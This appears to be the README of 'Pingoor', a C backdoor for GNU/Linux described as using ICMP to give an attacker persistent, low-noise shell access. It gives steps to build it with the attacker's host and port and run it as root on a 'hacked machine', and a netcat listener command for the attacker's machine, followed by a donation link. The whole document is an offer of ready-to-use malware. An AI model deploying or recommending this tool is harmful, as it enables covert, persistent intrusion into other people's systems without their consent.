<h1 align="center">「🚪」About Pingoor</h1>

<p align="center"><img src="assets/banner.png"></p>

<p align="center">Pingoor is a backdoor developed in C for the GNU/Linux operating system. Its main characteristic is to use the ICMP protocol to give the attacker access to the shell of a machine, making its access persistent with little noise.</p>

## How to Use

```
# Hacked machine
$ git clone https://github.com/tucommenceapousser/Pingoor.git
$ cd Pingoor
$ HOST=<YOURHOST> PORT=<YOURPORT> make
$ sudo ./pingoor
```

```
# Attacker machine
nc -lnvp <YOURPORT>
```

## Buy me a coffee?

<img src="https://static.livepix.gg/images/logo.svg" height="50" widght="50">

[LivePix](https://livepix.gg/mrempy)
